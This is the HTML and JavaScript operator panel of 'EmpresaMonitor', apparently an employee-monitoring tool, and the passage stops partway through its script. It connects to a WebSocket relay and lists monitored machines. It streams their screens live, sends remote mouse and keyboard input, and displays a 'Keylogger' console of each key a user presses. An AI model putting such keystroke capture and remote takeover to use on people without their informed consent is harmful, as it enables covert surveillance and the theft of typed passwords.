<!doctype html>
<html lang="pt-BR">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>EmpresaMonitor V3 Turbo</title>
    <style>
        /* --- CSS --- */
        *{box-sizing:border-box}
        body{font-family:Arial,sans-serif;background:#f3f5f8;color:#151515;margin:0}
        .wrap{max-width:1450px;margin:22px auto;padding:0 18px}
        .top,.card,.viewer,.keylog-container{background:#fff;border-radius:14px;padding:16px;margin-bottom:14px;box-shadow:0 2px 12px #0000000b}
        .row{display:flex;gap:8px;align-items:center;flex-wrap:wrap}
        input,select{padding:11px 12px;border:1px solid #ccc;border-radius:8px;min-width:240px}
        button{padding:10px 14px;border:1px solid #bbb;background:#fff;border-radius:8px;cursor:pointer}
        button:hover{background:#f1f1f1}
        .status{font-weight:bold}
        .ok{color:#087c3e}.bad{color:#b40000}.wait{color:#a36a00}
        .agent-title{font-size:18px;font-weight:bold}
        .small{color:#666;font-size:13px}
        .screen-wrap{background:#111;border-radius:12px;overflow:hidden;display:flex;justify-content:center;align-items:center;min-height:420px;position:relative}
        canvas{display:block;max-width:100%;height:auto;outline:none;cursor:crosshair}
        .metrics{margin-top:10px;color:#555;display:flex;gap:16px;flex-wrap:wrap}
        .control-banner{margin-top:10px;padding:10px;border-radius:8px;background:#fff3cd;font-weight:bold;display:none}
        .control-banner.active{display:block}
        .profile-help{font-size:12px;color:#777}
        .badge{display:inline-block;padding:3px 7px;border-radius:999px;background:#eef1f5;font-size:12px}
        .toolbar{margin-bottom:10px}
        .keylog-container { min-height: 150px; max-height: 300px; overflow-y: auto; }
        .log-entry { font-family: monospace; font-size: 14px; padding: 4px 0; border-bottom: 1px solid #eee; color: #333; }
        .log-time { color: #999; margin-right: 8px; }
        .log-key { font-weight: bold; color: #d63384; }
        .log-down { color: #28a745; }
        .log-up { color: #dc3545; }
    </style>
</head>
<body>
    <div class="wrap">
        <h1>EmpresaMonitor V3 — Turbo</h1>
        
        <div class="top">
            <div class="row">
                <input id="wsUrl" placeholder="wss://seu-realtime.up.railway.app">
                <input id="token" type="password" placeholder="ADMIN_TOKEN">
                <button id="connectBtn">Conectar</button>
                <span id="connStatus" class="status"></span>
            </div>
        </div>

        <div id="agents"></div>

        <div class="viewer">
            <h2>Monitoramento de Tela</h2>
            <div class="toolbar row">
                <label>Perfil:</label>
                <select id="profile">
                    <option value="fluid">Fluido — 1280px / 30 FPS</option>
                    <option value="balanced" selected>Equilibrado — 1600px / 25 FPS</option>
                    <option value="quality">Qualidade — 1920px / 20 FPS</option>
                </select>
                <button id="applyProfile">Aplicar perfil</button>
                <button id="fullBtn">Tela cheia</button>
                <span class="profile-help">Equilibrado é o recomendado para qualidade + fluidez.</span>
            </div>

            <div class="screen-wrap" id="screenWrap">
                <canvas id="screen" tabindex="0"></canvas>
            </div>

            <div id="controlBanner" class="control-banner">🔴 Controle remoto ativo — clique na tela para usar teclado e mouse.</div>

            <div class="metrics">
                <span id="fps">FPS: 0</span>
                <span id="bitrate">Recebimento: 0 Mbps</span>
                <span id="frames">Frames: 0</span>
                <span id="drops">Frames pulados: 0</span>
            </div>

            <div class="keylog-container" id="keylogContainer">
                <h3 style="margin-top:0">Console de Eventos (Keylogger)</h3>
                <div id="keylogList"></div>
            </div>
        </div>
    </div>

    <script>
        /* --- JAVASCRIPT --- */
        // Usamos window.addEventListener para garantir que o DOM esteja pronto
        window.addEventListener('DOMContentLoaded', () => {
            
            // Elementos do DOM
            const wsUrlEl = document.getElementById('wsUrl'),
                  tokenEl = document.getElementById('token'),
                  connectBtn = document.getElementById('connectBtn'),
                  connStatus = document.getElementById('connStatus'),
                  agentsEl = document.getElementById('agents'),
                  canvas = document.getElementById('screen'),
                  ctx = canvas.getContext('2d', { alpha: false }),
                  fpsEl = document.getElementById('fps'),
                  bitrateEl = document.getElementById('bitrate'),
                  framesEl = document.getElementById('frames'),
                  dropsEl = document.getElementById('drops'),
                  profileEl = document.getElementById('profile'),
                  applyProfile = document.getElementById('applyProfile'),
                  controlBanner = document.getElementById('controlBanner'),
                  screenWrap = document.getElementById('screenWrap'),
                  keylogList = document.getElementById('keylogList');

            let ws = null,
                agents = [],
                selectedAgentId = null,
                frames = 0,
                fpsFrames = 0,
                lastFps = performance.now(),
                bytesSecond = 0,
                dropped = 0,
                decoding = false,
                pendingFrame = null;

            // Inicialização de LocalStorage
            wsUrlEl.value = localStorage.getItem('em_ws') || '';
            tokenEl.value = localStorage.getItem('em_admin') || '';
            profileEl.value = localStorage.getItem('em_profile') || 'balanced';

            function setStatus(t, c = '') {
                connStatus.textContent = t;
                connStatus.className = 'status ' + c;
            }

            function send(o) {
                if (ws?.readyState === WebSocket.OPEN) {
                    ws.send(JSON.stringify(o));
                }
            }

            function esc(v = '') {
                return String(v).replaceAll('&', '&amp;').replaceAll('<', '&lt;').replaceAll('>', '&gt;').replaceAll('"', '&quot;').replaceAll("'", '&#039;');
            }

            // --- Funções de Keylog ---
            function addKeylog(key, down, ts) {
                const entry = document.createElement('div');
                entry.className = 'log-entry';
                const colorClass = down ? 'log-down' : 'log-up';
                const statusText = down ? 'PRESSIONADA' : 'SOLTA';
                entry.innerHTML = `<span class="log-time">[${ts}]</span> <span class="log-key">${esc(key)}</span> <span class="${colorClass}">${statusText}</span>`;
                keylogList.prepend(entry);
                if (keylogList.childNodes.length > 50) {
                    keylogList.removeChild(keylogList.lastChild);
                }
            }

            // --- Gerenciamento de Agentes ---
            function renderAgents() {
                agentsEl.innerHTML = agents.map(a => `
                    <div class="card">
                        <div class="agent-title">${esc(a.name)} — ${esc(a.user)}</div>
                        <div class="small">${esc(a.id)} ${a.version ? `· <span class="badge">${esc(a.version)}</span>` : ''}</div>
                        <br>
                        <div>${a.accessActive ? '🟢 acesso ativo' : '⚪ conectado'} · ${a.controlActive ? '🔴 controle ativo' : 'controle inativo'} · espectadores: ${a.watchers ?? 0}</div>
                        <br>
                        <button onclick="requestAccess('${a.id}')">Solicitar acesso</button> 
                        <button onclick="watchAgent('${a.id}')">Ver ao vivo</button> 
                        <button onclick="requestControl('${a.id}')">Solicitar controle</button> 
                        <button onclick="endControl('${a.id}')">Encerrar controle</button> 
                        <button onclick="endAccess('${a.id}')">Encerrar tudo</button>
                    </div>
                `).join('');
                
                const s = agents.find(a => a.id === selectedAgentId);
                controlBanner.className = 'control-banner' + (s?.controlActive ? ' active' : '');
            }

            window.requestAccess = id => send({ type: 'request_access', agentId: id });
            window.watchAgent = id => { selectedAgentId = id; send({ type: 'watch', agentId: id }); setProfile(id); };
            window.requestControl = id => { selectedAgentId = id; send({ type: 'watch', agentId: id }); setProfile(id); setTimeout(() => send({ type: 'request_control', agentId: id }), 80); };
            window.endControl = id => send({ type: 'end_control', agentId: id });
            window.endAccess = id => send({ type: 'end_access', agentId: id });

            function setProfile(id = selectedAgentId) {
                if (!id) return;
                const p = profileEl.value;
                localStorage.setItem('em_profile', p);
                send({ type: 'set_profile', agentId: id, profile: p });
            }

            applyProfile.onclick = () => setProfile();
            document.getElementById('fullBtn').onclick = () => screenWrap.requestFullscreen?.();

            // --- Conexão WebSocket ---
            connectBtn.onclick = () => {
                const url = wsUrlEl.value.trim();
                const token = tokenEl.value;
                localStorage.setItem('em_ws', url);
                localStorage.setItem('em_admin', token);
                
                if (ws) ws.close();
                setStatus('Conectando...', 'wait');

                try {
                    ws = new WebSocket(url);
                    ws.binaryType = 'arraybuffer';
                } catch (e) {
                    setStatus('URL inválida', 'bad');
                    return;
                }

                ws.onopen = () => send({ type: 'admin_hello', token });
                
                ws.onmessage = async (ev) => {
                    if (typeof ev.data === 'string') {
                        let m;
                        try { m = JSON.parse(ev.data); } catch { return; }
                        
                        if (m.type === 'error') { setStatus(m.message || 'Erro', 'bad'); return; }
                        if (m.type === 'admin_ready') { setStatus('Conectado', 'ok'); agents = m.agents || []; renderAgents(); return; }
                        if (m.type === 'agent_list') { agents = m.agents || []; renderAgents(); return; }
                        
                        // TRATAMENTO DO KEYLOG
                        if (m.type === 'keylog') {
                            addKeylog(m.key, m.down, m.ts);
                            return;
                        }
                        return;
                    }
                    
                    // Dados Binários (Frames de vídeo)
                    bytesSecond += ev.data.byteLength || 0;
                    queueFrame(ev.data);
                };

                ws.onclose = () => setStatus('Desconectado', 'bad');
                ws.onerror = () => setStatus('Erro de conexão', 'bad');
            };

            // --- Renderização de Vídeo ---
            function queueFrame(buf) {
                if (decoding) {
                    pendingFrame = buf;
                    dropped++;
                    dropsEl.textContent = 'Frames pulados: ' + dropped;
                    return;
                }
                decodeFrame(buf);
            }

            async function decodeFrame(buf) {
                decoding = true;
                try {
                    const bmp = await createImageBitmap(new Blob([buf], { type: 'image/jpeg' }));
                    if (canvas.width !== bmp.width || canvas.height !== bmp.height) {
                        canvas.width = bmp.width;
                        canvas.height = bmp.height;
                    }
                    ctx.drawImage(bmp, 0, 0);
                    bmp.close();
                    frames++;
                    fpsFrames++;
                    framesEl.textContent = 'Frames: ' + frames;
                } catch (e) {
                    console.error("Erro ao decodificar frame:", e);
                } finally {
                    decoding = false;
                    if (pendingFrame) {
                        const next = pendingFrame;
                        pendingFrame = null;
                        decodeFrame(next);
                    }
                }
            }

            // Loop de Métricas
            setInterval(() => {
                const now = performance.now();
                const fps = fpsFrames * 1000 / (now - lastFps);
                fpsEl.textContent = 'FPS: ' + fps.toFixed(1);
                bitrateEl.textContent = 'Recebimento: ' + (bytesSecond * 8 / 1000000).toFixed(2) + ' Mbps';
                fpsFrames = 0;
                bytesSecond = 0;
                lastFps = now;
            }, 1000);

            // --- Controle Remoto ---
            function selectedControlActive() {
                return !!agents.find(a => a.id === selectedAgentId && a.controlActive);
            }

            function controlSend(event) {
                if (!selectedControlActive()) return;
                send({ type: 'control_input', agentId: selectedAgentId, event });
            }

            let lastMove = 0;
            canvas.addEventListener('mousemove', e => {
                if (!selectedControlActive()) return;
                const now = performance.now();
                if (now - lastMove < 16) return;
                lastMove = now;
                const r = canvas.getBoundingClientRect();
                controlSend({
                    kind: 'move',
                    x: Math.max(0, Math.min(1, (e.clientX - r.left) / r.width)),
                    y: Math.max(0, Math.min(1, (e.clientY - r.top) / r.height))
                });
            });

            canvas.addEventListener('mousedown', e => {
                if (!selectedControlActive()) return;
                e.preventDefault();
                canvas.focus();
                const b = e.button === 0 ? 'left' : e.button === 2 ? 'right' : e.button === 1 ? 'middle' : null;
                if (b) controlSend({ kind: 'mouse', button: b, down: true });
            });

            canvas.addEventListener('mouseup', e => {
                if (!selectedControlActive()) return;
                e.preventDefault();
                const b = e.button === 0 ? 'left' : e.button === 2 ? 'right' : e.button === 1 ? 'middle' : null;
                if (b) controlSend({ kind: 'mouse', button: b, down: false });
            });

            canvas.addEventListener('contextmenu', e => { if (selectedControlActive()) e.preventDefault(); });

            canvas.addEventListener('wheel', e => {
                if (!selectedControlActive()) return;
                e.preventDefault();
                controlSend({ kind: 'wheel', delta: e.deltaY < 0 ? 120 : -120 });
            }, { passive: false });
